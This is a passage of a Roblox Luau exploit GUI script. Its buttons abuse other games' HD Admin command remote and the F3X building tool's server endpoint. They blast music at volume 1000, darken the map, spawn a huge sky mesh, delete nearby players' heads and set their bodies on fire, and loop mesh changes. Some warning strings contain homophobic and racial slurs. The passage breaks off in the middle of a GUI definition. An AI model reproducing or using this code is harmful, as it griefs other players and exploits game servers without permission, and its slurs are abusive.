		local function PYXR_fake_script() -- e_30.LocalScript 
			local script = Instance.new('LocalScript', e_30)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 137418375092271 ;pitch 0.11 ;volume 1000")
			end)
		end
		coroutine.wrap(PYXR_fake_script)()
		local function PNXERC_fake_script() -- e_31.LocalScript 
			local script = Instance.new('LocalScript', e_31)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 125974477780198 ;pitch 0.2 ;volume 1000")
			end)
		end
		coroutine.wrap(PNXERC_fake_script)()
		local function TZHFVF_fake_script() -- e_32.LocalScript 
			local script = Instance.new('LocalScript', e_32)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 85400095439616 ;pitch 0.2 ;volume 1000")
			end)
		end
		coroutine.wrap(TZHFVF_fake_script)()
		local function MNWNM_fake_script() -- e_33.LocalScript 
			local script = Instance.new('LocalScript', e_33)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 131426316419642 ;pitch 0.2 ;volume 1000")
			end)
		end
		coroutine.wrap(MNWNM_fake_script)()
		local function BKHIQD_fake_script() -- e_34.LocalScript 
			local script = Instance.new('LocalScript', e_34)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 136139539770810 ;pitch 0.2 ;volume 1000")
			end)
		end
		coroutine.wrap(BKHIQD_fake_script)()
		local function GNIDC_fake_script() -- e_35.LocalScript 
			local script = Instance.new('LocalScript', e_35)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 113786027626231 ;pitch 0.2 ;volume 1000")
			end)
		end
		coroutine.wrap(GNIDC_fake_script)()
		local function SFGGSA_fake_script() -- b_38.LocalScript 
			local script = Instance.new('LocalScript', b_38)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 100825376629691 ;pitch 1.05 ;volume 10")
			end)
		end
		coroutine.wrap(SFGGSA_fake_script)()
		local function DXCAEZU_fake_script() -- b_39.LocalScript 
			local script = Instance.new('LocalScript', b_39)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local Players = game:GetService("Players")
	
				local RequestCommand = ReplicatedStorage
					:WaitForChild("HDAdminHDClient")
					.Signals.RequestCommandSilent
	
	
				RequestCommand:InvokeServer(";unfog")
				RequestCommand:InvokeServer(";fogcolor black")
				RequestCommand:InvokeServer(";time 0")
	
				wait(0.3)
	
				local player = Players.LocalPlayer
				local char = player.Character or player.CharacterAdded:Wait()
	
	
				local tool
				for _,v in player:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
				for _,v in ReplicatedStorage:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
	
				if not tool then
					warn("No se encontró SyncAPI")
					return
				end
	
				local remote = tool.SyncAPI.ServerEndpoint
				local function _(args)
					remote:InvokeServer(unpack(args))
				end
	
				-- FUNCIONES F3X
				function CreatePart(cf,parent)
					_({
						[1] = "CreatePart",
						[2] = "Normal",
						[3] = cf,
						[4] = parent
					})
				end
	
				function AddMesh(part)
					_({
						[1] = "CreateMeshes",
						[2] = {
							[1] = {["Part"] = part}
						}
					})
				end
	
				function SetMesh(part,id)
					_({
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["MeshId"] = "rbxassetid://"..id
							}
						}
					})
				end
	
				function SetTexture(part,id)
					_({
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["TextureId"] = "rbxassetid://"..id
							}
						}
					})
				end
	
				function MeshResize(part,size)
					_({
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["Scale"] = size
							}
						}
					})
				end
	
				function SetCollision(part,bool)
					_({
						[1] = "SyncCollision",
						[2] = {
							[1] = {
								["Part"] = part,
								["CanCollide"] = bool
							}
						}
					})
				end
	
				function SetLocked(part,bool)
					_({
						[1] = "SetLocked",
						[2] = {[1] = part},
						[3] = bool
					})
				end
	
				function SetName(part,name)
					_({
						[1] = "SetName",
						[2] = {[1] = part},
						[3] = name
					})
				end
	
				function SetVertexColor(part,vec)
					_({
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["VertexColor"] = vec
							}
						}
					})
				end
	
				function CreateSpotlight(part)
					_({
						[1] = "CreateLights",
						[2] = {
							[1] = {
								["Part"] = part,
								["LightType"] = "SpotLight"
							}
						}
					})
				end
	
				function SyncLighting(part,brightness)
					_({
						[1] = "SyncLighting",
						[2] = {
							[1] = {
								["Part"] = part,
								["LightType"] = "SpotLight",
								["Brightness"] = brightness
							}
						}
					})
				end
	
	
				function Sky(textureId)
					local hrp = char:WaitForChild("HumanoidRootPart")
	
					local x = math.floor(hrp.Position.X)
					local y = math.floor(hrp.Position.Y)
					local z = math.floor(hrp.Position.Z)
	
					CreatePart(
						CFrame.new(x,y,z) + Vector3.new(0,-10,0),
						workspace
					)
	
					for _,v in workspace:GetDescendants() do
						if v:IsA("BasePart")
							and math.floor(v.Position.X) == x
							and math.floor(v.Position.Z) == z then
	
							SetName(v,"sky")
							AddMesh(v)
							SetMesh(v,"111891702759441")
							SetTexture(v, textureId)
	
							MeshResize(v, Vector3.new(99999,99999,99999))
							SetCollision(v,false)
							SetLocked(v,true)
	
	
							SetVertexColor(v, Vector3.new(1,1,1))
	
	
							CreateSpotlight(v)
							SyncLighting(v,12)
						end
					end
				end
	
	
				Sky("111175582812575")
			end)
	
			--97518021379547
		end
		coroutine.wrap(DXCAEZU_fake_script)()
		
		
		
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_26);
-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
local function C_28()
local script = G2L["28"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		local player = game.Players.LocalPlayer
		local char = player.Character or player.CharacterAdded:Wait()
	
		-- find shit
		local tool
		for _, v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
				break
			end
		end
		for _, v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
				break
			end
		end
		if not tool then
			warn("ไม่พบ SyncAPI Tool!")
			return
		end
	
		local remote = tool.SyncAPI.ServerEndpoint
	
	
		local head = char:FindFirstChild("Head")
		if not head then
			warn("fuck fagz")
			return
		end
		local headMesh = head:FindFirstChildWhichIsA("SpecialMesh")
		if not headMesh then
			warn("nigga")
			return
		end
	
	
		local hats = {}
		for _, hat in pairs(char:GetChildren()) do
			if hat:IsA("Accessory") and hat:FindFirstChild("Handle") then
				local handleMesh = hat.Handle:FindFirstChildWhichIsA("SpecialMesh")
				if handleMesh then
					table.insert(hats, {Part = hat.Handle, MeshId = handleMesh.MeshId})
				end
			end
		end
	
	
		local amplitude = 0.7
		local frequency = 6 
		local t = 0
	
		local RunService = game:GetService("RunService")
		RunService.RenderStepped:Connect(function(dt)
			t = t + dt * frequency
			local offsetValue = math.sin(t) * amplitude
	
	
			local partsToSync = {
				{Part = head, MeshId = headMesh.MeshId, Offset = Vector3.new(offsetValue, 0, 0)}
			}
			for _, h in pairs(hats) do
				table.insert(partsToSync, {Part = h.Part, MeshId = h.MeshId, Offset = Vector3.new(offsetValue, 0, 0)})
			end
	
			remote:InvokeServer("SyncMesh", partsToSync)
		end)
		
		
		
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_28);
-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
local function C_2a()
local script = G2L["2a"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		local player = game.Players.LocalPlayer
		local char = player.Character or player.CharacterAdded:Wait()
		local humanoid = char:WaitForChild("Humanoid")
		local animation = Instance.new("Animation")
	
		animation.AnimationId = "rbxassetid://27432686"
	
		local animTrack1 = humanoid:LoadAnimation(animation)
		animTrack1.Priority = Enum.AnimationPriority.Idle
	
		animTrack1:Play()
		animTrack1:AdjustSpeed(0)
	
		local animation = Instance.new("Animation")
		animation.AnimationId = "rbxassetid://183695923"
	
		local animTrack = humanoid:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Idle
		animTrack.Looped = true
	
		local walking = false
	
		humanoid.Running:Connect(function(speed)
			walking = speed > 1
	
			if walking and not animTrack.IsPlaying then
				animTrack:Play()
				animTrack1:Stop()
			end
	
			if not walking and animTrack.IsPlaying then
				animTrack:Stop()
				animTrack1:Play()
				animTrack1:AdjustSpeed(0)
			end
		end)
	
		spawn(function()
			while true do
				if walking then
					animTrack:AdjustSpeed(3)
					wait(0.3)
					animTrack:AdjustSpeed(-3)
					wait(0.3)
				else
					wait(0.1)
				end
			end
		end)
		
		
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_2a);
-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
local function C_2c()
local script = G2L["2c"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
		local player = game.Players.LocalPlayer
		local originalChar = player.Character or player.CharacterAdded:Wait()
		local tool
		while player.Character == originalChar do
			for i, v in player:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
	
			for i, v in game.ReplicatedStorage:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
	
			local remote = tool.SyncAPI.ServerEndpoint
	
			function _(args)
				remote:InvokeServer(unpack(args))
			end
	
			function DestroyPart(part)
				spawn(function()
					local args = {
						[1] = "Remove",
						[2] = {
							[1] = part
						}
					}
					_(args)
				end)
			end
	
			function AddDecor(part, dec)
				spawn(function()
					local args = {
						[1] = "CreateDecorations",
						[2] = {
							[1] = {
								["Part"] = part,
								["DecorationType"] = dec
							}
						}
					}
					_(args)
				end)
			end
	
			function a()
				local dist = 17
				local distance = dist
				local Player = game.Players.LocalPlayer
	
				if Player then
					local c = game.Players:GetChildren()
					for i = 1, #c do
						if c[i].Name ~= Player.Name then
							if c[i].Character and c[i].Character:FindFirstChild("Head") then
								local char = c[i].Character
								local torso = game.Workspace[Player.Name]:FindFirstChild("Torso")
								if torso and c[i]:DistanceFromCharacter(torso.Position) <= distance then
									DestroyPart(char:FindFirstChild("Head"))
									for _, part in ipairs(char:GetChildren()) do
										if part:IsA("BasePart") then
											AddDecor(part, "Fire")
										end
									end
								end
							end
						end
					end
				end
			end
	
	
			spawn(a)
			wait()
		end
		
		
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_2c);
-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
local function C_2e()
local script = G2L["2e"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
		local player = game.Players.LocalPlayer
		local char = player.Character or player.CharacterAdded:Wait()
		local humanrFr = char:WaitForChild("HumanoidRootPart")
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color,
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
		local cf = humanrFr.CFrame * CFrame.new(0, -4, 0)
		local pad = remote:InvokeServer("CreatePart", "Normal", cf, workspace)
		Resize(pad, Vector3.new(40, 1, 40), cf)
		SetAnchor(true, pad)
		SetCollision(pad, true)
		SetName(pad, "padF")
		AddMesh(pad)
		SetMesh(pad, 9095618661)
		MeshResize(pad, Vector3.new(4.5, 0.5, 4.5))
		Color(pad, BrickColor.new(104).Color)
		game:GetService("RunService").RenderStepped:Connect(function()
			if pad and humanrFr then
				local newCF = humanrFr.CFrame * CFrame.new(0, -4, 0)
				MovePart(pad, newCF)
			end
		end)
		
		
		
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_2e);
-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
local function C_30()
local script = G2L["30"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function a()
			presets = {"Bright red","Bright yellow","Bright orange","Bright violet","Bright blue","Bright bluish green","Bright green"}
			spawn(function()
				local args = {
					[1] = "SyncColor",
					[2] = {
						[1] = {
							["Color"] = BrickColor.new(presets[math.random(1,#presets)]).Color,
							["Part"] = game:GetService("Players").LocalPlayer.Character.Head,
							["UnionColoring"] = true
						},
						[2] = {
							["Color"] = BrickColor.new(presets[math.random(1,#presets)]).Color,
							["Part"] = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart,
							["UnionColoring"] = true
						},
						[3] = {
							["Color"] = BrickColor.new(presets[math.random(1,#presets)]).Color,
							["Part"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Left Arm"),
							["UnionColoring"] = true
						},
						[4] = {
							["Color"] = BrickColor.new(presets[math.random(1,#presets)]).Color,
							["Part"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Right Leg"),
							["UnionColoring"] = true
						},
						[5] = {
							["Color"] = BrickColor.new(presets[math.random(1,#presets)]).Color,
							["Part"] = game:GetService("Players").LocalPlayer.Character.Torso,
							["UnionColoring"] = true
						},
						[6] = {
							["Color"] = BrickColor.new(presets[math.random(1,#presets)]).Color,
							["Part"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Right Arm"),
							["UnionColoring"] = true
						},
						[7] = {
							["Color"] = BrickColor.new(presets[math.random(1,#presets)]).Color,
							["Part"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Left Leg"),
							["UnionColoring"] = true
						}
					}
				}
	
				_(args)
			end)
		end
	
		local warned = false
	
		local meshTypes = {
			Enum.MeshType.Brick,
			Enum.MeshType.Cylinder,
			Enum.MeshType.Head,
			Enum.MeshType.Sphere,
			Enum.MeshType.Wedge
		}
	
		local function getBuildingTool(player)
			for _, container in ipairs({player.Character, player.Backpack}) do
				if container then
					for _, item in ipairs(container:GetChildren()) do
						if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
							return item
						end
					end
				end
			end
			return nil
		end
	
		local function removemesh(part)
			for _, child in ipairs(part:GetChildren()) do
				if child:IsA("MeshPart") or child:IsA("SpecialMesh") then
					local args = {"Remove", { child }}
					local tool = getBuildingTool(game.Players.LocalPlayer)
					if tool then
						tool.SyncAPI.ServerEndpoint:InvokeServer(unpack(args))
					elseif not warned then
						warn("Building tool not found")
						warned = true
					end
				end
			end
		end
	
		local function applymesh(part)
			removemesh(part)
	
			local randomMeshType = meshTypes[math.random(1, #meshTypes)]
			local argsCreate = {"CreateMeshes", {{ Part = part }}}
			local argsSync   = {"SyncMesh",     {{ MeshType = randomMeshType, Part = part }}}
	
			local tool = getBuildingTool(game.Players.LocalPlayer)
			if tool then
				tool.SyncAPI.ServerEndpoint:InvokeServer(unpack(argsCreate))
				tool.SyncAPI.ServerEndpoint:InvokeServer(unpack(argsSync))
			elseif not warned then
				warn("Building tool not found")
				warned = true
			end
		end
	
		local player = game:GetService("Players").LocalPlayer
	
		local function randomizeCharacterMeshes(character)
			for _, obj in ipairs(character:GetDescendants()) do
				if (obj:IsA("Part") or obj:IsA("MeshPart")) then
					applymesh(obj)
				end
			end
		end
	
		while true do
			if player.Character then
				randomizeCharacterMeshes(player.Character)
			end
			wait() 
			spawn(function()
				a()
			end)
		end
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_30);
-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
local function C_32()
local script = G2L["32"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
	--[=[
	 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
	88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
	88      88    88    88            odD'      88      88    88 88ooo88 
	88  ooo 88    88    88          .88'        88      88    88 88~~~88 
	88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
	 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
	]=]
	
		-- Instances: 47 | Scripts: 22 | Modules: 0 | Tags: 0
		local G2L = {};
	
		-- StarterGui.ScreenGui
		G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
		G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
	
	
		-- StarterGui.ScreenGui.Frame
		G2L["2"] = Instance.new("Frame", G2L["1"]);
		G2L["2"]["BorderSizePixel"] = 4;
		G2L["2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["2"]["Size"] = UDim2.new(0, 391, 0, 485);
		G2L["2"]["Position"] = UDim2.new(0.44411, 0, 0.22297, 0);
		G2L["2"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
	
	
		-- StarterGui.ScreenGui.Frame.LocalScript
		G2L["3"] = Instance.new("LocalScript", G2L["2"]);
	
	
	
		-- StarterGui.ScreenGui.Frame.TextButton
		G2L["4"] = Instance.new("TextButton", G2L["2"]);
		G2L["4"]["TextWrapped"] = true;
		G2L["4"]["BorderSizePixel"] = 2;
		G2L["4"]["TextSize"] = 14;
		G2L["4"]["TextScaled"] = true;
		G2L["4"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["4"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["4"]["Size"] = UDim2.new(0, 108, 0, 46);
		G2L["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["4"]["Text"] = [[AHAH!]];
		G2L["4"]["Position"] = UDim2.new(0.37143, 0, 0.04141, 0);
	
	
		-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
		G2L["5"] = Instance.new("LocalScript", G2L["4"]);
	
	
	
		-- StarterGui.ScreenGui.Frame.TextButton
		G2L["6"] = Instance.new("TextButton", G2L["2"]);
		G2L["6"]["TextWrapped"] = true;
		G2L["6"]["BorderSizePixel"] = 2;
		G2L["6"]["TextSize"] = 14;
		G2L["6"]["TextScaled"] = true;
		G2L["6"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["6"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["6"]["Size"] = UDim2.new(0, 122, 0, 46);
		G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["6"]["Text"] = [[pillz got us falling in love]];
		G2L["6"]["Position"] = UDim2.new(0.66555, 0, 0.04141, 0);
	
	
		-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
		G2L["7"] = Instance.new("LocalScript", G2L["6"]);
	
	
	
		-- StarterGui.ScreenGui.Frame.TextButton
		G2L["8"] = Instance.new("TextButton", G2L["2"]);
		G2L["8"]["TextWrapped"] = true;
		G2L["8"]["BorderSizePixel"] = 2;
		G2L["8"]["TextSize"] = 14;
		G2L["8"]["TextScaled"] = true;
		G2L["8"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["8"]["Size"] = UDim2.new(0, 122, 0, 46);
		G2L["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["8"]["Text"] = [[looping the rooms]];
		G2L["8"]["Position"] = UDim2.new(0.0381, 0, 0.04141, 0);
	
	
		-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
		G2L["9"] = Instance.new("LocalScript", G2L["8"]);
	
	
	
		-- StarterGui.ScreenGui.Frame.TextButton
		G2L["a"] = Instance.new("TextButton", G2L["2"]);
		G2L["a"]["TextWrapped"] = true;
		G2L["a"]["BorderSizePixel"] = 2;
		G2L["a"]["TextSize"] = 14;
		G2L["a"]["TextScaled"] = true;
		G2L["a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["a"]["Size"] = UDim2.new(0, 122, 0, 46);
		G2L["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["a"]["Text"] = [[Blood Pop]];
		G2L["a"]["Position"] = UDim2.new(0.03639, 0, 0.16356, 0);
	
	
		-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
		G2L["b"] = Instance.new("LocalScript", G2L["a"]);
	
	
	
		-- StarterGui.ScreenGui.Frame.TextButton
		G2L["c"] = Instance.new("TextButton", G2L["2"]);
		G2L["c"]["TextWrapped"] = true;
		G2L["c"]["BorderSizePixel"] = 2;
		G2L["c"]["TextSize"] = 14;
		G2L["c"]["TextScaled"] = true;
		G2L["c"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["c"]["Size"] = UDim2.new(0, 122, 0, 46);
		G2L["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["c"]["Text"] = [[Blood Pop short]];
		G2L["c"]["Position"] = UDim2.new(0.37143, 0, 0.16356, 0);
	
	
		-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
		G2L["d"] = Instance.new("LocalScript", G2L["c"]);
	
	
	
		-- StarterGui.ScreenGui.Frame.TextButton
		G2L["e"] = Instance.new("TextButton", G2L["2"]);
		G2L["e"]["TextWrapped"] = true;
		G2L["e"]["BorderSizePixel"] = 2;
		G2L["e"]["TextSize"] = 14;
		G2L["e"]["TextScaled"] = true;
		G2L["e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["e"]["Size"] = UDim2.new(0, 252, 0, 46);
		G2L["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["e"]["Text"] = [[Hazy Moon]];
		G2L["e"]["Position"] = UDim2.new(0.0381, 0, 0.28364, 0);
	
	
		-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
		G2L["f"] = Instance.new("LocalScript", G2L["e"]);
	
	
	
		-- StarterGui.ScreenGui.Frame.TextButton
		G2L["10"] = Instance.new("TextButton", G2L["2"]);
		G2L["10"]["TextWrapped"] = true;
		G2L["10"]["BorderSizePixel"] = 2;
		G2L["10"]["TextSize"] = 14;
		G2L["10"]["TextScaled"] = true;
		G2L["10"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["10"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["10"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["10"]["Size"] = UDim2.new(0, 122, 0, 46);
		G2L["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["10"]["Text"] = [[ST**PER  B**th]];
		G2L["10"]["Position"] = UDim2.new(0.0381, 0, 0.50311, 0);
	
	
		-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
		G2L["11"] = Instance.new("LocalScript", G2L["10"]);
	
	
	
		-- StarterGui.ScreenGui.Frame.TextButton
		G2L["12"] = Instance.new("TextButton", G2L["2"]);
		G2L["12"]["TextWrapped"] = true;
		G2L["12"]["BorderSizePixel"] = 2;
		G2L["12"]["TextSize"] = 14;
		G2L["12"]["TextScaled"] = true;
		G2L["12"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["12"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["12"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["12"]["Size"] = UDim2.new(0, 122, 0, 46);
		G2L["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
